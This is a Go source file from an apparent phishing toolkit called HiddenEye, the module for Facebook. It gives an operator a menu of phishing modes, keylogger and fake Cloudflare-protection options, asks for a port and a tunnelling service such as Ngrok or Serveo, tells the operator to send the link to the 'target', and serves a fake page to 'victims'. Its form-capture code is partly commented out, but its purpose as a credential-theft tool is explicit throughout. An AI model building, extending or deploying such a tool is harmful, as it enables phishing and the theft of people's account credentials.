package controllers

import (
	"HiddenEye/helpers"
	Colors "HiddenEye/utils"
	"fmt"
	"html/template"
	"net/http"
	"strconv"
)

func Facebook() {
	helpers.Clear_screen()
	fmt.Println(Colors.Red(), "\n\n["+Colors.White()+"*"+Colors.Red()+"]", Colors.White(), " Facebook module is loaded sucessfully\t")
	fmt.Println(Colors.Red(), "\n["+Colors.White()+"*"+Colors.Red()+"]", Colors.White(), " Select Mode\t")

	fmt.Println(Colors.Red(), "\n\n--------------------------------------------------------------------------------------------------")

	fmt.Print(Colors.Red(), "\nOperation Mode:")
	fmt.Println(Colors.Red(), "\n\n["+Colors.White()+"1"+Colors.Red()+"]", Colors.White(), " Standard Phising Attack",
		Colors.Red(), "\t\t\t["+Colors.White()+"2"+Colors.Red()+"]", Colors.White(), " Fake Security",
	)

	fmt.Println(Colors.Red(), "\n\n["+Colors.White()+"3"+Colors.Red()+"]", Colors.White(), " Poll Ranking Phising Attack",
		Colors.Red(), "\t\t["+Colors.White()+"4"+Colors.Red()+"]", Colors.White(), " Poll Mesenger Credentials",
	)

	fmt.Print(Colors.Red(), "\n\n┌─[ "+Colors.Green()+"HIDDEN-EYE"+Colors.Blue()+"~"+Colors.White()+"@HOME"+Colors.Red()+
		"/"+Colors.Blue()+"TEMPLATE"+Colors.Red()+" ]"+"\n└──╼ "+Colors.White()+"$ ")

	option := helpers.Input_User(1, 4)

	if option == 1 {
		helpers.Clear_screen()
		helpers.Prompt()

		fmt.Println(Colors.Red(), "\n\n["+Colors.White()+"1"+Colors.Red()+"]", Colors.White(), " Keylogger",
			Colors.Red(), "\n\n["+Colors.White()+"2"+Colors.Red()+"]", Colors.White(), " Fake CloudFare Protection",
		)

		fmt.Println(Colors.Red(), "\n["+Colors.White()+"3"+Colors.Red()+"]", Colors.White(), " Capture Data Email")

		fmt.Print(Colors.Red(), "\n\n┌─[ "+Colors.Green()+"HIDDEN-EYE"+Colors.Blue()+"~"+Colors.White()+"@HOME"+Colors.Red()+
			"/"+Colors.Blue()+"TEMPLATE"+
			"/"+Colors.Blue()+"FEATURES"+Colors.Red()+" ]"+"\n└──╼ "+Colors.White()+"$ ")

		option := helpers.Input_User(1, 3)

		if option == 1 {
			fmt.Println(option)
		} else if option == 2 {
			helpers.Clear_screen()
			helpers.Prompt()

			fmt.Println(Colors.Red(), "\n\n["+Colors.White()+"*"+Colors.Red()+"]", Colors.White(), " Insert a custom redirect URL")

			fmt.Print(Colors.Red(), "\nRedirect URL >> "+Colors.White())

			var url string
			fmt.Scanln(&url)

			helpers.Clear_screen()
			helpers.Prompt()

			fmt.Println(Colors.Red(), "\n\n["+Colors.White()+"*"+Colors.Red()+"]", Colors.White(), " Select Port [1-65535]")
			fmt.Println(Colors.Red(), "\n["+Colors.White()+"*"+Colors.Red()+"]", Colors.White(), " We suggest using ports between [1024-65535] but you still able to choose any ports you want.")
			fmt.Println(Colors.Red(), "\n["+Colors.White()+"*"+Colors.Red()+"]", Colors.White(), " In case of Ngrok use the port you set for Ngrok")

			fmt.Print(Colors.Red(), "\nRedirect Port >> "+Colors.White())

			var port int

			_, err := fmt.Scanln(&port)
			if err != nil {
				fmt.Println(err)
			}

			helpers.Clear_screen()
			helpers.Prompt()

			fmt.Println(Colors.Red(), "\n\n["+Colors.White()+"*"+Colors.Red()+"]", Colors.White(), " Selecy any availible server")

			fmt.Println(Colors.Red(), "\n\n["+Colors.White()+"1"+Colors.Red()+"]", Colors.White(), " Localhost",
				Colors.Red(), "\t\t["+Colors.White()+"2"+Colors.Red()+"]", Colors.White(), " Ngrok",
			)

			fmt.Println(Colors.Red(), "\n\n["+Colors.White()+"3"+Colors.Red()+"]", Colors.White(), " Serveo",
				Colors.Red(), "\t\t\t["+Colors.White()+"4"+Colors.Red()+"]", Colors.White(), " Localxpose",
			)

			fmt.Println(Colors.Red(), "\n\n["+Colors.White()+"5"+Colors.Red()+"]", Colors.White(), " Localtunnel",
				Colors.Red(), "\t\t["+Colors.White()+"6"+Colors.Red()+"]", Colors.White(), " OpenPort",
			)

			fmt.Println(Colors.Red(), "\n\n["+Colors.White()+"7"+Colors.Red()+"]", Colors.White(), " PageKite")

			fmt.Print(Colors.Red(), "\n\n┌─[ "+Colors.Green()+"HIDDEN-EYE"+Colors.Blue()+"~"+Colors.White()+"@HOME"+Colors.Red()+
				"/"+Colors.Blue()+"TEMPLATE"+Colors.Red()+
				"/"+Colors.Blue()+"FEATURES"+Colors.Red()+
				"/"+Colors.Blue()+"SERVER"+Colors.Red()+" ]"+"\n└──╼ "+Colors.White()+"$ ")

			option := helpers.Input_User(1, 7)

			if option == 1 {
				fmt.Print(Colors.Red(), "\n\n["+Colors.White()+"*"+Colors.Red()+"]", Colors.White(), " Send this URL to the target on the same nertwork")
				fmt.Print(Colors.Red(), "\n\n["+Colors.White()+"*"+Colors.Red()+"]", Colors.Green(), " Localhost URL : https://localhost:", port)
				fmt.Print(Colors.Red(), "\n\n["+Colors.White()+"*"+Colors.Red()+"]", Colors.White(), " Hidden Eye is Listening to https://localhost:", port)
				fmt.Print(Colors.Red(), "\n\n["+Colors.White()+"*"+Colors.Red()+"]", Colors.White(), " Waiting for the target to Interact")

				handlerPhising(port)
			}

		}

	}

}

var tpl *template.Template

func init() {
	tpl = template.Must(template.ParseGlob("templates/*.gohtml"))
}

func handlerPhising(p int) {
	port := strconv.Itoa(p)
	http.HandleFunc("/", index)
	http.HandleFunc("/process", processor)
	http.ListenAndServe(":"+port, nil)
}

func index(w http.ResponseWriter, r *http.Request) {
	fmt.Println("\n\n  " + Colors.Red() + " [+] " + Colors.White() + "  Victum is interacting with the server")
	tpl.ExecuteTemplate(w, "index.gohtml", nil)
}

func processor(w http.ResponseWriter, r *http.Request) {
	if r.Method != "POST" {
		http.Redirect(w, r, "/", http.StatusSeeOther)
		return
	}

	// fname := r.FormValue("firster")
	// lname := r.FormValue("laster")
	// surf := r.FormValue("surf")
	// snow := r.FormValue("snow")
	// skate := r.FormValue("skate")
	// radio := r.FormValue("cow")

	// d := struct {
	// 	First, Last, Surf, Snow, Skate, Radio string
	// }{
	// 	First: fname,
	// 	Last:  lname,
	// 	Surf:  surf,
	// 	Snow:  snow,
	// 	Skate: skate,
	// 	Radio: radio,
	// }

	http.Redirect(w, r, "http://www.golang.org", http.StatusSeeOther)
}
